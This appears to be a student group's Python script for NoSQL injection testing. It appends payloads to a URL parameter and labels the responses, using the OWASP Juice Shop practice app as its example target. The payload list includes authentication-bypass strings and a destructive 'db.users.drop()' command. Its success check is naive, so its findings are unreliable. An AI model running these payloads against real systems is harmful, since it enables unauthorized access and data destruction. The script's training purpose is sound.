""""
G6:
Alisson Curay
Víctor Moreno
Alex Ramos
"""
import requests
import json

def nosql_injection_test(url, parameter_name, payloads):
  """
  Función que realiza pruebas de intrusión NoSQL Injection en una URL específica.

  Args:
    url: URL de la aplicación web a probar.
    parameter_name: Nombre del parámetro de la URL a inyectar.
    payloads: Lista de payloads de inyección NoSQL.

  Returns:
    Diccionario con los resultados de las pruebas.
  """

  results = {}

  for payload in payloads:
    # Crear una copia de la URL original
    modified_url = url

    # Agregar el payload al parámetro especificado
    if parameter_name in modified_url:
      modified_url = modified_url.replace(parameter_name + "=", parameter_name + "=" + payload)
    else:
      modified_url += "&" + parameter_name + "=" + payload

    # Enviar una solicitud HTTP a la URL modificada
    response = requests.get(modified_url)

    # Analizar la respuesta
    if response.status_code == 200:
      # Si la respuesta es 200, verificar si hay errores en el JSON
      try:
        json_data = json.loads(response.text)
      except json.JSONDecodeError:
        results[payload] = "Error de decodificación JSON: " + response.text
      else:
        # Si no hay errores en el JSON, verificar si el payload tuvo éxito
        if "error" in json_data:
          results[payload] = "Error en la respuesta: " + json_data["error"]
        else:
          results[payload] = "Posible inyección NoSQL"
    else:
      # Si la respuesta no es 200, registrar el código de error
      results[payload] = "Código de error HTTP: " + str(response.status_code)

  return results

if __name__ == "__main__":
  # Ejemplo de uso
  url = "https://juice-shop.herokuapp.com/#/login"
  parameter_name = "q"
  payloads = [
    "' or 1=1--",
        "' or '1'='1",
        "'; db.users.find({})",
        "'; db.users.drop()"
  ]

  results = nosql_injection_test(url, parameter_name, payloads)
  for payload, result in results.items():
    print(f"Payload: {payload} - Resultado: {result}")
